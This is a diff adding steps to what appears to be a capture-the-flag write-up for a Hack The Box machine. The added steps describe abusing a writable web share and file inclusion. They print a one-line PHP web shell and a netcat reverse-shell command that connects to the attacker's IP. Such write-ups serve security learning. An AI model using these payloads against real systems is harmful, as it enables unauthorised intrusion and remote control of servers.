@@ -104,4 +104,25 @@
 <img width="912" height="136" alt="image" src="https://github.com/user-attachments/assets/1fa4fc69-ebd8-45ad-908e-4009f2940692" />
 
 
+15. We have write permissions on the Web share. We will put a test file into the school.flight.htb directory to see if we can access files in that folder from the file inclusion vulnerable view parameter
+
+<img width="1433" height="311" alt="image" src="https://github.com/user-attachments/assets/a55bf107-fc72-4113-b7a0-d2ed9a189154" />
+
+16. Yes, we can! We will now upload a PHP webshell to get code execution on the server. Success!
+
+`<?php system($_REQUEST['cmd']); ?>`
+
+<img width="531" height="120" alt="image" src="https://github.com/user-attachments/assets/fc1e80d3-aef7-42ed-8256-d3914b785b99" />
+
+17. Now, we will upgrade to a proper reverse shell by uploading netcat and using that to connect to our attacker host
+
+`nc.exe 10.10.14.226 4444 -e cmd.exe`
+
+<img width="521" height="128" alt="image" src="https://github.com/user-attachments/assets/c4862cde-ab09-422c-aa92-318fe4344593" />
+
+18. Now, we have a foothold on the machine!
+
+
+
+
 
